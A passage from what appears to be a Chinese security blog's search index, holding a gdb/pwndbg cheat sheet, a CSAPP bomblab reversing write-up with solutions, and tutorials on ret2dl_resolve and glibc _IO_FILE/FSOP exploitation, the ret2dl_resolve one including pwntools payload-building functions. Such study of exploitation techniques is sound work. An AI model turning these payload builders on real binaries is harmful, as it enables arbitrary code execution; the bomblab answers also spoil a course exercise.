x/(n)xg addr:从addr开始,以8字节为单位输出内存内容. x/(n)xw addr:同上,4字节. x/s:当作ascii字符串输出,x/ws打印四字节宽字符字符串,x/hs打印两字节宽字符字符串,使用p sizeof(wchar_t)查看平台宽字符字节大小. x/(n)i:反汇编操作. set var variable = expr:有源代码时使用,设置变量值,也可以用于设置寄存器值,set var $eax = 8. set {type}address = expr:任意时间使用,类似指针,set {int}0x8047a54 = 8,set {char [4]} 0x80477a4 = &quot;Ace&quot;. quit(q):退出. pwndbg vmmap:显示虚拟内存空间排布. heap:以chunk的形式显示主分配区heap. parseheap:显示堆状况. bin:显示bin列表. elfheader:查看elf文件中各个段的起始地址. search:可以查找内存中的字符串. canary:可以查看canary的值.]]></content>
      <categories>
        <category>binary</category>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-CSAPP-bomblab]]></title>
    <url>%2Fposts%2F525b5041%2F</url>
    <content type="text"><![CDATA[准备首先进行静态分析,objdump -d bomb &gt; bomb.txt. 根据bomb.c文件可以知道部分关键函数为:phase_[1-6],phase_defused,read_line. read_line从bomb.c已知此函数返回一个input.从后向前跟踪%rax. 123456789mov 0x20223b(%rip),%edx # 603760 &lt;num_input_strings&gt;movslq %edx,%raxlea (%rax,%rax,4),%rsishl $0x4,%rsiadd $0x603780,%rsi...add $0x1,%edxmov %edx,0x2021a4(%rip) # 603760 &lt;num_input_strings&gt;mov %rsi,%rax 可知返回值为0x603780 + 0x10 * 5 * *(int *)0x603760. 可以猜出这片缓冲区为存储我们输入字符串的地方. 可知0x603760 &lt;num_input_strings&gt;就是当前要读的字符串的序号,也就是当前关卡序号. 该函数还调用了skip函数.感觉没什么用,暂不分析. phase_defused12cmpl $0x6,0x202181(%rip) # 603760 &lt;num_input_strings&gt;jne 40163f &lt;phase_defused+0x7b&gt; 该函数首先判断了当前num_input_strings,只有num_input_strings == 6也就是第六次读入之后.可以看出这应该就是隐藏关入口. 123456lea 0x10(%rsp),%r8lea 0xc(%rsp),%rcxlea 0x8(%rsp),%rdxmov $0x402619,%esimov $0x603870,%edicallq 400bf0 &lt;__isoc99_sscanf@plt&gt; __isoc99_sscanf(0x603870, 0x402619, 0x8(%rsp), 0xc(%rsp), 0x10(%rsp)). sscanf相当于以第一个字符串参数为标准输入端输入内容的scanf. 参数0x603870等于0x603760 + 0x50 * 3,可知用的是第四关答案字符串. 参数0x402619为字符串,gdb查看. 后三个参数为对应的局部变量地址. 12cmp $0x3,%eaxjne 401635 &lt;phase_defused+0x71&gt; sscanf返回值为成功读入的格式化控制符对应的参数个数. 12345mov $0x402622,%esilea 0x10(%rsp),%rdicallq 401338 &lt;strings_not_equal&gt;test %eax,%eaxjne 401635 &lt;phase_defused+0x71&gt; 这里调用了strings_not_equal函数,顾名思义. 参数为刚才的第五个参数的地址(对应%s)和字符串地址0x402622.gdb查看. 后面就是通过返回值跳转然后打印大哥字符串并调用secret_phase(隐藏关). 所以第四关答案应该为&lt;number&gt; &lt;number&gt; DrEvil. 题目有了之前的准备就可以开始做题了. phase_1123callq 40149e &lt;read_line&gt;mov %rax,%rdicallq 400ee0 &lt;phase_1&gt; 12345mov $0x402400,%esicallq 401338 &lt;strings_not_equal&gt;test %eax,%eaxje 400ef7 &lt;phase_1+0x17&gt;callq 40143a &lt;explode_bomb&gt; 第一题就是检测输入字符串是否与0x402400处字符串相同. phase_212345push %rbppush %rbxsub $0x28,%rspmov %rsp,%rsicallq 40145c &lt;read_six_numbers&gt; 函数read_six_numbers顾名思义.参数为一个指向栈缓冲区的指针和input. 调用read_six_numbers后先判断. 12cmpl $0x1,(%rsp)je 400f30 &lt;phase_2+0x34&gt; 要求第一个数为1.然后执行循环体. 123456789101112lea 0x4(%rsp),%rbxlea 0x18(%rsp),%rbpjmp 400f17 &lt;phase_2+0x1b&gt;;0x400f17mov -0x4(%rbx),%eaxadd %eax,%eaxcmp %eax,(%rbx)je 400f25 &lt;phase_2+0x29&gt;;0x400f25add $0x4,%rbxcmp %rbp,%rbxjne 400f17 &lt;phase_2+0x1b&gt; 比较前一个值和后一个值,要求a[i] = a[i - 1] * 2.典型的for循环,循环5次,正好检测6个数. 所以第二题答案为1 2 4 8 16 32. phase_3123callq 40149e &lt;read_line&gt;mov %rax,%rdicallq 400f43 &lt;phase_3&gt; 12345lea 0xc(%rsp),%rcxlea 0x8(%rsp),%rdxmov $0x4025cf,%esimov $0x0,%eaxcallq 400bf0 &lt;__isoc99_sscanf@plt&gt; 函数调用__isoc99_sscanf(input, 0x4025cf, 0x8(%rsp), 0xc(%rsp)). gdb查看0x4025cf. 12cmp $0x1,%eaxjg 400f6a &lt;phase_3+0x27&gt; 检测返回值是否大于1. 12cmpl $0x7,0x8(%rsp)ja 400fad &lt;phase_3+0x6a&gt; 检测第一个数是否小于等于7. 然后就是典型的switch结构.gdb查看0x402470及后面的跳转表. 12cmp 0xc(%rsp),%eaxje 400fc9 &lt;phase_3+0x86&gt; 之后将第二个数与之前放入%eax的值比较,要求相等.所以答案多解. phase_412345lea 0xc(%rsp),%rcxlea 0x8(%rsp),%rdxmov $0x4025cf,%esimov $0x0,%eaxcallq 400bf0 &lt;__isoc99_sscanf@plt&gt; 1234cmp $0x2,%eaxjne 401035 &lt;phase_4+0x29&gt;cmpl $0xe,0x8(%rsp)jbe 40103a &lt;phase_4+0x2e&gt; 要求读两个整数,且第一个整数小于等于0xe. 1234mov $0xe,%edxmov $0x0,%esimov 0x8(%rsp),%edicallq 400fce &lt;func4&gt; 调用func4(0x8(%rsp), 0, 0xe);. 1234test %eax,%eaxjne 401058 &lt;phase_4+0x4c&gt;cmpl $0x0,0xc(%rsp)je 40105d &lt;phase_4+0x51&gt; 要求返回值等于0.还有第二个整数也为0. 由于第一个整数小于等于0xe.可以直接爆破或者解析func4. 1234567mov %edx,%eaxsub %esi,%eaxmov %eax,%ecxshr $0x1f,%ecxadd %ecx,%eaxsar %eaxlea (%rax,%rsi,1),%ecx %ecx = (a3 - a2) / 2 + a2;. 12cmp %edi,%ecxjle 400ff2 &lt;func4+0x24&gt; 判断%ecx是否小于等于a1(参数一).如果不,就执行下面汇编代码. 1234lea -0x1(%rcx),%edxcallq 400fce &lt;func4&gt;add %eax,%eaxjmp 401007 &lt;func4+0x39&gt; 即调用func4(a1, a2, %ecx - 1),将返回值翻倍后跳转到函数返回阶段. 如果是,就执行下面汇编代码. 123mov $0x0,%eaxcmp %ecx,%edxjge 8048cac &lt;func4+0x55&gt; 返回值置0,然后判断%edx是否大于等于a1.如果大于进入函数返回阶段. 如果不,就执行下面汇编代码. 123456mov $0x0,%eaxcmp %edi,%ecxjge 401007 &lt;func4+0x39&gt;lea 0x1(%rcx),%esicallq 400fce &lt;func4&gt;lea 0x1(%rax,%rax,1),%eax 再次判断%ecx是否大于a1,是则调用func4(a1, %ecx + 1, a3),将返回值翻倍加一后跳转到函数返回阶段. 逆向成C语言.v1即%ecx. 1234567v1 = (a3 - a2) / 2 + a2;if ( v1 &gt; a1 ) return 2 * func4(a1, a2, v1 - 1);result = 0;if ( v1 &lt; a1 ) result = 2 * func4(a1, v1 + 1, a3) + 1;return result; phase_5123callq 40131b &lt;string_length&gt;cmp $0x6,%eaxje 4010d2 &lt;phase_5+0x70&gt; 检测string_length(input)返回值是否为6.顾名思义即要求输入字符串长度为6. 123456789101112131415;0x401067mov %rdi,%rbx;0X4010d2mov $0x0,%eaxjmp 40108b &lt;phase_5+0x29&gt;;0X40108bmovzbl (%rbx,%rax,1),%ecxmov %cl,(%rsp)mov (%rsp),%rdxand $0xf,%edxmovzbl 0x4024b0(%rdx),%edxmov %dl,0x10(%rsp,%rax,1)add $0x1,%raxcmp $0x6,%raxjne 40108b &lt;phase_5+0x29&gt; 初始化%eax == 0,循环%rdx = input[%rax] &amp; 0xf,判断%rax != 6则继续. 然后以%rdx为偏移量取位于0x4024b0的字符数组的字符放置到0x10(%rsp,%rax,1)的缓冲区字符数组中. 123456movb $0x0,0x16(%rsp)mov $0x40245e,%esilea 0x10(%rsp),%rdicallq 401338 &lt;strings_not_equal&gt;test %eax,%eaxje 4010d9 &lt;phase_5+0x77&gt; 在缓冲区字符数组末尾加上\0字符,然后调用strings_not_equal(0x10(%rsp), 0x40245e). gdb查看0x4024b0和0x40245e. phase_61234sub $0x50,%rspmov %rsp,%r13mov %rsp,%rsicallq 40145c &lt;read_six_numbers&gt; 先调用read_six_numbers(input, %rsp). 1234567891011121314151617181920212223mov %rsp,%r14mov $0x0,%r12d;0x401114mov %r13,%rbpmov 0x0(%r13),%eaxsub $0x1,%eaxcmp $0x5,%eaxjbe 401128 &lt;phase_6+0x34&gt;;0x401128add $0x1,%r12dcmp $0x6,%r12dje 401153 &lt;phase_6+0x5f&gt;mov %r12d,%ebxmovslq %ebx,%raxmov (%rsp,%rax,4),%eaxcmp %eax,0x0(%rbp)jne 401145 &lt;phase_6+0x51&gt;callq 40143a &lt;explode_bomb&gt;add $0x1,%ebxcmp $0x5,%ebxjle 401135 &lt;phase_6+0x41&gt;add $0x4,%r13jmp 401114 &lt;phase_6+0x20&gt; 以%r12d为基数寄存器,检测六个数是否大于6,大于6则bomb. 同时在此次循环中以%ebx = %r12d为基数寄存器循环检测其与后面的数是否相等. %r12d == 6则跳出循环. 12345678910lea 0x18(%rsp),%rsimov %r14,%raxmov $0x7,%ecx;0x401160mov %ecx,%edxsub (%rax),%edxmov %edx,(%rax)add $0x4,%raxcmp %rsi,%raxjne 401160 &lt;phase_6+0x6c&gt; 然后运行到这里,循环赋值num = 7 - num. 12345678910111213141516171819202122mov $0x0,%esijmp 401197 &lt;phase_6+0xa3&gt;;0x401176mov 0x8(%rdx),%rdxadd $0x1,%eaxcmp %ecx,%eaxjne 401176 &lt;phase_6+0x82&gt;jmp 401188 &lt;phase_6+0x94&gt;;0x401183mov $0x6032d0,%edx;0x401188mov %rdx,0x20(%rsp,%rsi,2)add $0x4,%rsicmp $0x18,%rsije 4011ab &lt;phase_6+0xb7&gt;;0x401197mov (%rsp,%rsi,1),%ecxcmp $0x1,%ecxjle 401183 &lt;phase_6+0x8f&gt;mov $0x1,%eaxmov $0x6032d0,%edxjmp 401176 &lt;phase_6+0x82&gt; gdb查看0x6032d0,根据提示和gdb查看内存可知这是一个node链表. 12345struct node &#123; int num; int id; struct node * next;&#125; 这里按照输入的六个整数,以第i个整数的值来匹配node的id,将node的地址放置到0x20(%rsp,%rsi,2)缓冲区整数指针数组中. 12345678910111213141516171819202122mov 0x20(%rsp),%rbxlea 0x28(%rsp),%raxlea 0x50(%rsp),%rsimov %rbx,%rcxmov (%rax),%rdxmov %rdx,0x8(%rcx)add $0x8,%raxcmp %rsi,%raxje 4011d2 &lt;phase_6+0xde&gt;mov %rdx,%rcxjmp 4011bd &lt;phase_6+0xc9&gt;movq $0x0,0x8(%rdx);code: 00mov $0x5,%ebpmov 0x8(%rbx),%raxmov (%rax),%eaxcmp %eax,(%rbx)jge 4011ee &lt;phase_6+0xfa&gt;callq 40143a &lt;explode_bomb&gt;mov 0x8(%rbx),%rbxsub $0x1,%ebpjne 4011df &lt;phase_6+0xeb&gt; 最后通过地址将node的num取到缓冲区,然后循环比较缓冲区数组值是否为递减序列. secret_phase12345678910push %rbxcallq 40149e &lt;read_line&gt;mov $0xa,%edxmov $0x0,%esimov %rax,%rdicallq 400bd0 &lt;strtol@plt&gt;mov %rax,%rbxlea -0x1(%rax),%eaxcmp $0x3e8,%eaxjbe 40126c &lt;secret_phase+0x2a&gt; 先调用read_line();,然后strtol(input, 0, 0xa);将输入转换为整数. 检测输入的数是否过大,%eax - 1 &gt; 1000. 12345mov %ebx,%esimov $0x6030f0,%edicallq 401204 &lt;fun7&gt;cmp $0x2,%eaxje 401282 &lt;secret_phase+0x40&gt; 调用fun7(0x6030f0, input_num);.如果返回值等于3即可通过检测. 123456789101112131415161718test %rdi,%rdije 401238 &lt;fun7+0x34&gt;mov (%rdi),%edxcmp %esi,%edxjle 401220 &lt;fun7+0x1c&gt;mov 0x8(%rdi),%rdicallq 401204 &lt;fun7&gt;add %eax,%eaxjmp 40123d &lt;fun7+0x39&gt;mov $0x0,%eaxcmp %esi,%edxje 40123d &lt;fun7+0x39&gt;mov 0x10(%rdi),%rdicallq 401204 &lt;fun7&gt;lea 0x1(%rax,%rax,1),%eaxjmp 40123d &lt;fun7+0x39&gt;mov $0xffffffff,%eaxadd $0x8,%rsp 转化为C语言. 12345678if ( !a1 ) return 0xFFFFFFFFLL;if ( *(_DWORD *)a1 &gt; (signed int)a2 ) return 2 * (unsigned int)fun7(*(_QWORD *)(a1 + 8), a2);result = 0LL;if ( *(_DWORD *)a1 != (_DWORD)a2 ) result = 2 * (unsigned int)fun7(*(_QWORD *)(a1 + 16), a2) + 1;return result;]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-pwn-ret2dl_resolve]]></title>
    <url>%2Fposts%2F310ebe05%2F</url>
    <content type="text"><![CDATA[动态链接数据基础程序分为静态链接跟动态链接,在处理动态链接程序时会采取延迟绑定(lazy binding)的技术.即位于动态链接库的函数被调用时才会确定函数在进程中的位置. 下面用一个x86程序分析. 123456789101112131415161718w4rd3n@cws:~/temp$ readelf -S pwn共有 31 个节头，从偏移量 0x17f0 开始：节头： [Nr] Name Type Addr Off Size ES Flg Lk Inf Al ... [ 5] .dynsym DYNSYM 080481cc 0001cc 000050 10 A 6 1 4 #动态链接符号表 [ 6] .dynstr STRTAB 0804821c 00021c 00004a 00 A 0 0 1 #动态链接的字符串 ... [ 9] .rel.dyn REL 08048290 000290 000008 08 A 5 0 4 #用于对数据引用的修正,修正的位置位于.got和数据段 [10] .rel.plt REL 08048298 000298 000010 08 AI 5 24 4 #用于对函数引用的修正,修正的位置位于.got.plt ... [12] .plt PROGBITS 080482d0 0002d0 000030 04 AX 0 0 16 #全局函数plt表,用于跳转,第一项用于解析函数地址 ... [22] .dynamic DYNAMIC 08049f14 000f14 0000e8 08 WA 6 0 4 #动态链接信息 [23] .got PROGBITS 08049ffc 000ffc 000004 04 WA 0 0 4 #全局变量偏移表 [24] .got.plt PROGBITS 0804a000 001000 000014 04 WA 0 0 4 #全局函数偏移表 ... 其中.got.plt前三项不是全局函数偏移. .dynamic基址. link_map结构体指针. dl_runtime_resolve函数指针. 动态段信息. 123456789101112131415161718w4rd3n@cws:~/temp$ readelf -d pwnDynamic section at offset 0xf14 contains 24 entries: 标记 类型 名称/值 ... 0x00000005 (STRTAB) 0x804821c 0x00000006 (SYMTAB) 0x80481cc 0x0000000a (STRSZ) 74 (bytes) 0x0000000b (SYMENT) 16 (bytes) ... 0x00000003 (PLTGOT) 0x804a000 0x00000002 (PLTRELSZ) 16 (bytes) 0x00000014 (PLTREL) REL 0x00000017 (JMPREL) 0x8048298 0x00000011 (REL) 0x8048290 0x00000012 (RELSZ) 8 (bytes) 0x00000013 (RELENT) 8 (bytes) ... 重定位节信息. 1234567891011w4rd3n@cws:~/temp$ readelf -r pwn重定位节 '.rel.dyn' 位于偏移量 0x290 含有 1 个条目： 偏移量 信息 类型 符号值 符号名称08049ffc 00000206 R_386_GLOB_DAT 00000000 __gmon_start__重定位节 '.rel.plt' 位于偏移量 0x298 含有 2 个条目： 偏移量 信息 类型 符号值 符号名称0804a00c 00000107 R_386_JUMP_SLOT 00000000 read@GLIBC_2.00804a010 00000307 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0#偏移量就是对应.plt.got的地址. 动态链接符号表信息. 12345678910w4rd3n@cws:~/temp$ readelf -s pwnSymbol table '.dynsym' contains 5 entries: Num: Value Size Type Bind Vis Ndx Name 0: 00000000 0 NOTYPE LOCAL DEFAULT UND 1: 00000000 0 FUNC GLOBAL DEFAULT UND read@GLIBC_2.0 (2) ...Symbol table '.symtab' contains 70 entries:#.symtab包含大量linker,debugger需要的数据;.dynsym包含.symtab的一个子集,比如共享库需要的动态链接加载的函数对应的symbols. 符号对应的符号表信息.dynsym[num]中的num是通过((r_info)&gt;&gt;8)索引的,r_info为.rel.plt或.rel.dyn中的信息项的值. 例如:.dynsym的地址为0x80481cc,read函数对应的num为1,查看一下ndx name为read处的内存. 动态链接函数执行流程以read函数为例.read函数内容为. read第一次调用时0x804a00c(对应的.got.plt表项)的值为read@plt + 6的地址. 跳转后先将0×0压栈(即相对.rel.plt的偏移,因为read在.rel.plt中时第一个,所以偏移为0),又跳转到0x80482d0. 0x804a004为一个指向内部link_map结构的指针,在动态装载器内部使用. 0x804a008处为函数dl_runtime_resolve(struct link_map *l, ElfW(Word) rel_offset).即调用函数dl_runtime_resolve(link_map, 0×0),解析出地址,然后写到对应.got.plt并跳转执行. dl_runtime_resolve调用_dl_fixup函数实现具体逻辑,最后解析出来的函数地址保存在rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);. 利用如果伪造rel_offset及对应的其他结构体,便可以执行任意函数.具体参考_dl_fixup源码. 如果.dynamic可写,将.dynstr地址改写为.bss地址,然后在bss段伪造目标函数的字符串.(偏移0x44).dynamic不可写,可以将传入的rel_offset改为目标函数的偏移. 但是.rel.plt中不一定存在目标函数,可以将rel_offset修改为一个比较大的值,在可控的.rel.plt + rel_offset处伪造一个Elf32_Rel结构. 由RELENT可知,.rel.plt项大小为8字节.结构体定义如下. 12345678910111213141516171819typedef struct &#123; Elf32_Addr r_offset; Elf32_Word r_info;&#125; Elf32_Rel;#define ELF32_R_SYM(info) ((info)&gt;&gt;8)#define ELF32_R_TYPE(info) ((unsigned char)(info))#define ELF32_R_INFO(sym, type) (((sym)&lt;&lt;8)+(unsigned char)(type))//...typedef struct &#123; Elf32_Word st_name; //如果此值为0,那么此符号无名字. Elf32_Addr st_value; Elf32_Word st_size; unsigned char st_info; unsigned char st_other; Elf32_Half st_shndx;&#125; Elf32_Sym; 程序根据r_info找到对应结构体.dynsym[num],伪造Elf32_Sym -&gt; st_name,使.dynstr + st_name可控,放置目标函数字符串即可. 但这里存在一个问题,index过大会导致ndx过大从而导致段错误. 12345const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;version = &amp;l-&gt;l_versions[ndx];if (version-&gt;hash == 0) version = NULL; 这个问题x86和x86-64有不同解决方案. x86x86通过可以通过构造ndx为0来绕过. 123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *def ret2dl_resolve_x86(path, stage, func, resolve_target): elf = ELF(path) plt0 = elf.get_section_by_name('.plt').header.sh_addr jmprel = elf.dynamic_value_by_tag("DT_JMPREL")#rel_plt relent = elf.dynamic_value_by_tag("DT_RELENT")#size of jmprel struct symtab = elf.dynamic_value_by_tag("DT_SYMTAB")#dynsym syment = elf.dynamic_value_by_tag("DT_SYMENT")#size of symtab strtab = elf.dynamic_value_by_tag("DT_STRTAB")#dynstr versym = elf.dynamic_value_by_tag("DT_VERSYM")#version padlen = syment - ((stage - symtab) % syment) fake_addr_sym = stage + padlen fake_symbol_index = (fake_addr_sym - symtab) / syment while True: ndx = u16(elf.read(versym + fake_symbol_index * 2, 2)) if ndx != 0: fake_symbol_index += 1 continue else: break fake_addr_sym = symtab + fake_symbol_index * syment sym_padlen = fake_addr_sym - stage stage = fake_addr_sym + syment padlen = relent - ((stage - jmprel) % relent) fake_addr_reloc = stage + padlen padlen_reloc = padlen fake_addr_symstr = fake_addr_reloc + relent r_info = (((fake_addr_sym - symtab) / syment) &lt;&lt; 8) | 0x7 fake_st_name = fake_addr_symstr - strtab resolve_data = "S" * sym_padlen resolve_data += struct.pack('&lt;IIII', fake_st_name, 0, 0, 0x12)#Elf32_Sym resolve_data += "S" * padlen_reloc resolve_data += struct.pack('&lt;II', resolve_target, r_info)#Elf32_Rel resolve_data += func fake_reloc_offset = fake_addr_reloc - jmprel resovle_call = p32(plt0) + p32(fake_reloc_offset) return resolve_data, resovle_call x86-64基本原理与32bit相同.只是一些结构体发生变化,参数传递方式也不一样.然后绕过version方式变成了使link_map + 0x1c8为NULL. 123456789101112131415161718192021222324252627282930313233343536373839#https://github.com/inaz2/roputils/blob/master/roputils.pydef dl_resolve_data(self, base, name): jmprel = self.dynamic('JMPREL') relaent = self.dynamic('RELAENT') symtab = self.dynamic('SYMTAB') syment = self.dynamic('SYMENT') strtab = self.dynamic('STRTAB') addr_reloc, padlen_reloc = self.align(base, jmprel, relaent) addr_sym, padlen_sym = self.align(addr_reloc + relaent, symtab, syment) addr_symstr = addr_sym + syment r_info = (((addr_sym - symtab) / syment) &lt;&lt; 32) | 0x7 st_name = addr_symstr - strtab buf = self.fill(padlen_reloc) buf += struct.pack('&lt;QQQ', base, r_info, 0) buf += self.fill(padlen_sym) buf += struct.pack('&lt;IIQQ', st_name, 0x12, 0, 0) buf += self.string(name) return bufdef dl_resolve_call(self, base, *args): #覆盖link_map + 0x1c8为NULL #参数自行设置 if args: raise Exception('arguments must be set to the registers beforehand') jmprel = self.dynamic('JMPREL') relaent = self.dynamic('RELAENT') addr_reloc, padlen_reloc = self.align(base, jmprel, relaent) reloc_offset = (addr_reloc - jmprel) / relaent buf = self.p(self.plt()) buf += self.p(reloc_offset) return buf 但这种利用需要泄露,所以不太实用. 查看_dl_fixup源码可发现,当对应的.dynsym节中Elf32_Sym结构的st_other值为非0时,会进入另一个分支. 1234567#define DL_FIXUP_MAKE_VALUE(map, addr) (addr)if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) &#123; /* code */&#125; else &#123; value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value); result = l;&#125; sym和l都由传入的link_map结构体指针决定,可以伪造link_map结构,使l-&gt;l_addr和sym-&gt;st_value两个变量一个为某个已解析的GOT表条目,另一个为需要的偏移,就能获得任意libc地址. 123456789101112131415161718192021pwndbg&gt; ptype ltype = struct link_map &#123; Elf64_Addr l_addr; char *l_name; Elf64_Dyn *l_ld; struct link_map *l_next; struct link_map *l_prev; struct link_map *l_real; Lmid_t l_ns; struct libname_list *l_libname; Elf64_Dyn *l_info[76]; //l_info 里面包含的就是动态链接的各个表的信息 #... size_t l_tls_firstbyte_offset; ptrdiff_t l_tls_offset; size_t l_tls_modid; size_t l_tls_dtor_count; Elf64_Addr l_relro_addr; size_t l_relro_size; unsigned long long l_serial; struct auditstate l_audit[];&#125; * l_addr可以直接设置为偏移.所以需要使sym-&gt;st_value为某个已解析的GOT表条目. 12345678#define DT_SYMTAB 6//获取符号表地址const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]);//获取函数对应的重定位表结构地址const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);//获取函数对应的符号表结构地址const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]; 可以控制reloc-&gt;r_info为0,这样就是&amp;symtab[ELFW(R_SYM) (0)]. 又因为symtab为l_info[6],所以可以控制symtab[0]. 12345678910111213141516171819202122from pwn import *def ret2dl_resolve_x64(stage, reloc_index, offset, got_libc): fake_link_map = p64(offset)#l-&gt;l_addr fake_link_map = fake_link_map.ljust(0x10,'\x00') fake_link_map = fake_link_map.ljust(0x30,'\x00') target_write = stage + 0x28 fake_jmprel = p64(target_write - offset) fake_jmprel += p64(7) fake_jmprel += p64(0) fake_link_map += fake_jmprel fake_link_map = fake_link_map.ljust(0x68,'\x00') fake_link_map += p64(stage)#DT_STRTAB fake_link_map += p64(stage + 0x78 - 8)#fake_DT_SYMTAB fake_link_map += p64(got_libc - 8)#st-&gt;other != 0, st-&gt;st_value = libc fake_link_map += p64(stage + 0x30 - 0x18 * reloc_index)#fake_reloc fake_link_map = fake_link_map.ljust(0xf8,'\x00') fake_link_map += p64(stage + 0x80 - 8)#fake_DT_JMPREL return fake_link_map 还有种思路是控制l_addr刚好落在已存在的libc地址上,构造思路同上.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Linux-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-pwn-IO_FILE分析与利用]]></title>
    <url>%2Fposts%2F25456c3a%2F</url>
    <content type="text"><![CDATA[概念glibc利用_IO_FILE结构实现了文件流,是基本文件描述符的高级接口,支持流缓冲. 通过fopen打开文件获得,fopen首先在堆中分配一片区域存放文件结构体,然后对结构体初始化并链接到以一个_IO_FILE_plus链表中,最后打开文件. 可以通过攻击原有的stdout等_IO_FILE结构体或者覆盖_IO_FILE指针指向伪造的_IO_FILE从而利用结构中一个叫做vtable的指针来执行任意代码.也可以覆盖stdout泄露libc基址. 源码分析glibc 2.23中对应结构体名称是_IO_FILE_plus,包含了一个_IO_FILE结构体和一个_IO_jump_t结构体指针vtable(_IO_FILE_plus和_IO_jump_t定义于libio/libioP.h,_IO_FILE定义于libio/libio.h),vtable是一种兼容C++虚函数的实现.当对流进行函数调用时,会调用该流跳转表中对应的函数. 1234567891011121314151617181920212223//libio/libioP.hstruct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); //more JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_imbue_t, __imbue);#if 0 get_column; set_column;#endif&#125;;struct _IO_FILE_plus&#123; _IO_FILE file; const struct _IO_jump_t *vtable;&#125;;extern struct _IO_FILE_plus *_IO_list_all; _IO_FILE成员变量对应偏移. 12345678910111213141516171819202122232425262728293031323334350x0 _flags0x8 _IO_read_ptr0x10 _IO_read_end0x18 _IO_read_base#read buf0x20 _IO_write_base0x28 _IO_write_ptr0x30 _IO_write_end#write buf0x38 _IO_buf_base0x40 _IO_buf_end#reserve buf0x48 _IO_save_base0x50 _IO_backup_base0x58 _IO_save_end0x60 _markers0x68 _chain#文件结构体指针链表0x70 _fileno#文件描述符0x74 _flags20x78 _old_offset0x80 _cur_column0x82 _vtable_offset0x83 _shortbuf0x88 _lock0x90 _offset0x98 _codecvt0xa0 _wide_data0xa8 _freeres_list0xb0 _freeres_buf0xb8 __pad50xc0 _mode0xc4 _unused20xd8 vtable 进程中的_IO_FILE_plus结构体会通过_chain构成一个链表,链表头部为全局变量_IO_list_all. FSOPFSOP(File Stream Oriented Programming)的核心思想就是劫持_IO_list_all的值来伪造链表和其中的_IO_FILE项(当然也可以直接覆盖bss段的指针或者覆盖原有结构体),通过调用_IO_flush_all_lockp函数触发,该函数会刷新_IO_list_all链表中所有项的文件流,相当于对每个FILE调用fflush,也对应着会调用_IO_FILE_plus.vtable中的_IO_overflow. _IO_flush_all_lockp不需要攻击者手动调用，在一些情况下这个函数会被系统调用. libc执行abort流程时(malloc_printerr). 执行exit函数时. 执行流从main函数返回时. libc-2.24防御与bypass在libc-2.24中加入了对vtable指针的检查.新增了两个函数:IO_validate_vtable(libio/libioP.h)和_IO_vtable_check(libio/vtables.c). 所有的libio vtables被放进了专用的只读的__libc_IO_vtables段,以使它们在内存中连续.在任何间接跳转之前,vtable指针将根据段边界进行检查,如果指针不在这个段,则调用函数_IO_vtable_check()做进一步的检查,并且在必要时终止进程. 由于无法伪造虚表,只能在__libc_IO_vtables段里面找可利用的vtable. 比如_IO_str_jumps(libio/strops.c). 1234567const struct _IO_jump_t _IO_str_jumps =&#123; JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_str_finish), JUMP_INIT(overflow, _IO_str_overflow), //more&#125;; 其中_IO_str_overflow函数如下. 1234567891011121314151617181920212223242526272829303132333435int _IO_str_overflow (_IO_FILE *fp, int c)&#123; int flush_only = c == EOF; _IO_size_t pos; if (fp-&gt;_flags &amp; _IO_NO_WRITES) return flush_only ? 0 : EOF; if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)) &#123; fp-&gt;_flags |= _IO_CURRENTLY_PUTTING; fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr; fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end; &#125; pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base; if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)) //#define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base) &#123; if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */ return EOF; else &#123; char *new_buf; char *old_buf = fp-&gt;_IO_buf_base; size_t old_blen = _IO_blen (fp); _IO_size_t new_size = 2 * old_blen + 100; if (new_size &lt; old_blen) return EOF; new_buf = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size); //对应指针和参数都可控 ... &#125; ... &#125; ...&#125; _IO_strfile定义. 1234567891011121314151617struct _IO_str_fields&#123; _IO_alloc_type _allocate_buffer; _IO_free_type _free_buffer; &#125;;struct _IO_streambuf&#123; struct _IO_FILE _f; const struct _IO_jump_t *vtable;&#125;;typedef struct _IO_strfile_&#123; struct _IO_streambuf _sbf; struct _IO_str_fields _s;&#125; _IO_strfile; bypass条件与利用. fp-&gt;_flags &amp; _IO_NO_WRITES为假. fp-&gt;_flags &amp; _IO_USER_BUF(0x01)为假. 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100不能为负数. new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100,这里控制rdi. fp + 0xe0指向需要劫持到的函数. 完整的调用过程:malloc_printerr -&gt; 